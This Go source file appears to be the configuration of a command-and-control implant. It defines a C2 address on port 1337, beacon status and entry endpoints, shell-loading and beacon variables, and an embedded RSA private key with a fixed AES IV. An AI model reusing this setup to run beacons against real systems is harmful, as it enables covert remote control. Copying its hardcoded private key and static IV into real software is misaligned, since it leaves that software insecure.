package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDGHAAGtJWPdhmulS8kIvvOqod7cwFa2//zugjv
u+yeYp3dwp4qCOwu3Udd97T3mjW/qROMrNtEI+9sZIQsJRdulLEDcX38dwOCez2wrbMSjSQOWD7A
AROb710rlEE8a2Sk6+cFw1myz6D2qOipo6jFx3Tvywpu245EJCItlkOk6QIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAMYcAAa0lY92Ga6VLyQi+86qh3tz
AVrb//O6CO+77J5ind3CnioI7C7dR133tPeaNb+pE4ys20Qj72xkhCwlF26UsQNxffx3A4J7PbCt
sxKNJA5YPsABE5vvXSuUQTxrZKTr5wXDWbLPoPao6KmjqMXHdO/LCm7bjkQkIi2WQ6TpAgMBAAEC
gYADLAD+50nhVXFwbD7belxQWqzQ1+Gkxaxeh7l+tFV3BodjI0URN9ON2O9WFh7r7sIMJgkqmCMd
Za5LkxZsqh4qzCLz0R192wC62k5iBlr4GrrgLquU3fReO51wnxbQwIiXl/XlX5I66MAmpVUlosyh
nssaT/VEedulMI4J97J1WwJBAMudUBh5AiD9VQmFWbnbu7zlKMC5n98tSaMLKonh4eBCdKIlk83h
6Z4ZeU6PAAfyOcAUnOD8tF5oME3Q9lB3FbcCQQD5FBownZbxcB7+BQ+0Cz3nc8l5niwghl7LKwhm
wXggF5f2owm3sX14HsDW8tX/+B82ESEOUBShX5gxKl69EhpfAkAeK7ZFmhCtsLwcCA1uk9eyusYa
IKdG26AQr8Pi4HymzVIZALZxCGukiKPH9zqK8uKJysQgNnHHl2qo7TDCZZLrAkAd07JvL+/raanM
cX636MC4/ryZu789BdpEKhsPcwuXjDu+ZTe8r5x+ze/5zYqi5GuYZeS3eg9+Y5wuBwzhR1GxAkBs
mQeu56P0I3FMYP/Ok8Og2n6np10GpVL0Bz1CdzzelVvLI4Iglbdm3jlGU6jf8o/Fx+BKUcsKM3nt
WorP8FcA
-----END PRIVATE KEY-----
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
	ShellPreLoadedFile string
)

const (
	DebugMode = true
)